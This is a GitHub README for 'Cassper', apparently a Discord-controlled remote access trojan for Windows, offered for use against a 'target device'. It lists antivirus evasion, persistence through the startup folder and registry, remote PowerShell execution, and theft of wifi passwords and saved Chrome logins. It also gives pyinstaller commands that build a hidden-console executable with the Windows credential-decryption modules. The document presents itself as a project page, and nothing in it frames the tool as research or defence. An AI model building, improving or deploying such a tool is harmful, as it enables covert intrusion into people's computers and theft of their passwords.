
# Project Title

A brief description of what this project does and who it's for


## Documentation

[Documentation](https://linktodocumentation)


## Authors

- [@LeonBoussen](https://www.github.com/LeonBoussen)


## Features

Automatic
- Windows Defender bypass (indevelopment)
- Copy self to startup folder & registry
- 
Executable commands
- What (help for all commands)
- PS (execute powershell commands)
- GetSysInfo (Get system info like cpu, ip, mac ect)
- getwifipass (Get all wifi ssid's and password the target has ever been conneced to)
- whoami (See as what user the console is running)
- screen (start / stop)
- steal (steals saved chrome email and passwords)

## Environment Variables

To run this project, you will need to add the following environment variables to your .env file
TOKEN = "BOT TOKEN" # Discord bot token
GUILD_ID = "12345678" # Replace with your actual server ID


## Installation

make discord bot in discord development portal
git clone https://github.com/LeonBoussen/Cassper.git
replace the Enviroment Variables shown in the "Enviroment Variables" tab ^

```bash
  pip install psutil imageio discord.py pyautogui pycryptodome numpy pywin32
  pyinstaller --onefile --noconsole --hidden-import=psutil --hidden-import=imageio --hidden-import=discord --hidden-import=asyncio --hidden-import=platform --hidden-import=pyautogui --hidden-import=win32crypt --hidden-import=subprocess --hidden-import=numpy --hidden-import=Crypto.Cipher.AES --hidden-import=datetime --hidden-import=discord.ext.commands --hidden-import=win32crypt.CryptUnprotectData main.py
```
    
## Deployment

To deploy this project run

```bash
  install on target device
```


## Screenshots

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

